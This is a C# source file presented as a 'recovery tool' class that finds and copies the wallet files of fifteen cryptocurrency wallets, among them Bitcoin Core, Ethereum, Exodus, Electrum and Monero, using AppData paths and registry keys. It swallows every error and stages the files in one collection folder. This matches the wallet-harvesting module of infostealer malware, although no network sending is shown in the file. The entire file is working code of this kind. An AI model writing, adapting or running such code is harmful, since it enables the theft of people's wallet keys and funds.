using RecoveryTool.Recovery.Utilities;
using System.Collections.Concurrent;
using Microsoft.Win32;

namespace RecoveryTool.Recovery.Wallets
{
    public class CryptoWalletService
    {
        private record Wallet(string Name, Func<string, Task> SaveFunction);

        private static readonly Wallet[] Wallets =
        [
            new("Ethereum", SaveEthereumFilesAsync),
            new("Electrum", SaveElectrumFilesAsync),
            new("DashCore", SaveDashCoreFileAsync),
            new("Bytecoin", SaveBytecoinFilesAsync),
            new("BitcoinCore", SaveBitcoinCoreFileAsync),
            new("Atomic", SaveAtomicFilesAsync),
            new("Armory", SaveArmoryFilesAsync),
            new("Exodus", SaveExodusFilesAsync),
            new("Jaxx", SaveJaxxFilesAsync),
            new("LitecoinCore", SaveLitecoinCoreFileAsync),
            new("Monero", SaveMoneroCoreFileAsync),
            new("Zcash", SaveZcashFilesAsync),
            new("Coinomi", SaveCoinomiFilesAsync),
            new("Guarda", SaveGuardaFilesAsync),
            new("Zephyr", SaveZephyrFilesAsync)
        ];

        public static async Task SaveCryptoAsync()
        {
            var walletsWithContent = new ConcurrentBag<Wallet>();

            var checkTasks = Wallets.Select(async wallet =>
            {
                if (await CheckContentExistsAsync(wallet.SaveFunction))
                {
                    walletsWithContent.Add(wallet);
                }
            });

            await Task.WhenAll(checkTasks);

            if (!walletsWithContent.IsEmpty)
            {
                var saveAllWalletsPath = Common.EnsureWalletsPath();

                var saveTasks = walletsWithContent.Select(wallet =>
                    wallet.SaveFunction(Path.Combine(saveAllWalletsPath, wallet.Name))
                );

                await Task.WhenAll(saveTasks);
            }
        }

        private static async Task<bool> CheckContentExistsAsync(Func<string, Task> saveFunction)
        {
            return await Task.Run(async () =>
            {
                var tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());

                try
                {
                    Directory.CreateDirectory(tempPath);
                    await saveFunction(tempPath);
                    return Directory.EnumerateFileSystemEntries(tempPath).Any();
                } catch { return false; }
                finally
                {
                    try
                    {
                        Directory.Delete(tempPath, true);
                    } catch { }
                }
            });
        }

        private static Task SaveFilesFromDirectoryAsync(string sourcePath, string destinationPath, string searchPattern = "*")
        {
            foreach (var file in Directory.EnumerateFiles(sourcePath, searchPattern, SearchOption.AllDirectories))
            {
                var relativePath = Path.GetRelativePath(sourcePath, file);
                var destFilePath = Path.Combine(destinationPath, relativePath);
                Directory.CreateDirectory(Path.GetDirectoryName(destFilePath)!);
                File.Copy(file, destFilePath, overwrite: true);
            }
            return Task.CompletedTask;
        }

        private static Task SaveFileFromRegistryAsync(string destinationPath, string registryPath, string valueKey, string fileName)
        {
            try
            {
                using var registryKey = Registry.CurrentUser.OpenSubKey(registryPath);
                var dataDir = registryKey?.GetValue(valueKey)?.ToString();

                if (!string.IsNullOrEmpty(dataDir))
                {
                    var sourceFilePath = Path.Combine(dataDir, fileName);
                    var destFilePath = Path.Combine(destinationPath, fileName);
                    Directory.CreateDirectory(Path.GetDirectoryName(destFilePath)!);
                    File.Copy(sourceFilePath, destFilePath, overwrite: true);
                }
            }
            catch { }

            return Task.CompletedTask;
        }

        private static Task SaveEthereumFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(Path.Combine(Common.AppData, "Ethereum", "keystore"), destinationPath);

        private static Task SaveElectrumFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(Path.Combine(Common.AppData, "Electrum", "wallets"), destinationPath);

        private static Task SaveDashCoreFileAsync(string destinationPath) =>
            SaveFileFromRegistryAsync(destinationPath, @"Software\Dash\Dash-Qt", "strDataDir", "wallet.dat");

        private static Task SaveBytecoinFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(Path.Combine(Common.AppData, "bytecoin"), destinationPath, "*.wallet");

        private static Task SaveBitcoinCoreFileAsync(string destinationPath) =>
            SaveFileFromRegistryAsync(destinationPath, @"Software\Bitcoin\Bitcoin-Qt", "strDataDir", "wallet.dat");

        private static Task SaveAtomicFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(
                Path.Combine(Common.AppData, "atomic", "Local Storage", "leveldb"),
                Path.Combine(destinationPath, "Local Storage", "leveldb")
            );

        private static Task SaveArmoryFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(Path.Combine(Common.AppData, "Armory"), destinationPath);

        private static Task SaveExodusFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(Path.Combine(Common.AppData, "Exodus", "exodus.wallet"), destinationPath);

        private static Task SaveJaxxFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(
                Path.Combine(Common.AppData, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"),
                Path.Combine(destinationPath, "IndexedDB", "file__0.indexeddb.leveldb")
            );

        private static Task SaveLitecoinCoreFileAsync(string destinationPath) =>
            SaveFileFromRegistryAsync(destinationPath, @"Software\Litecoin\Litecoin-Qt", "strDataDir", "wallet.dat");

        private static Task SaveMoneroCoreFileAsync(string destinationPath)
        {
            try
            {
                using var registryKey = Registry.CurrentUser.OpenSubKey(@"Software\monero-project\monero-core");
                var walletPath = registryKey?.GetValue("wallet_path")?.ToString()?.Replace("/", "\\");
                if (!string.IsNullOrEmpty(walletPath))
                {
                    var fileName = Path.GetFileName(walletPath);
                    var destFilePath = Path.Combine(destinationPath, fileName);
                    File.Copy(walletPath, destFilePath, overwrite: true);
                }
            }
            catch { }

            return Task.CompletedTask;
        }

        private static Task SaveZcashFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(Path.Combine(Common.AppData, "Zcash"), destinationPath);

        private static Task SaveCoinomiFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(Path.Combine(Common.AppData, "Coinomi", "Coinomi", "wallets"), destinationPath);

        private static Task SaveGuardaFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(
                Path.Combine(Common.AppData, "Guarda", "Local Storage", "leveldb"),
                Path.Combine(destinationPath, "Local Storage", "leveldb")
            );

        private static Task SaveZephyrFilesAsync(string destinationPath) =>
            SaveFilesFromDirectoryAsync(Path.Combine(Common.AppData, "Zephyr", "wallets"), destinationPath);
    }
}
